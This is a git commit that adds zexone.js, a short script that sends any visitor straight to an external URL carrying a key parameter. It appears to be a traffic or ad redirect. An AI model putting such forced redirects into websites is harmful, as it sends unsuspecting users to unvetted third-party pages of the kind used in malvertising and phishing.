48da32bf25b2f5a2eba616159af819f94a28c5ad
jarollellhel <80411308+jarollellhel@users.noreply.github.com>
2021-07-03 21:23:28 +0800

    Create zexone.js

---
+++ zexone.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+
+  'https://inquiryclank.com/z5u26gw0i?key=afd8bed48a5de3937c8422b84862a994'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
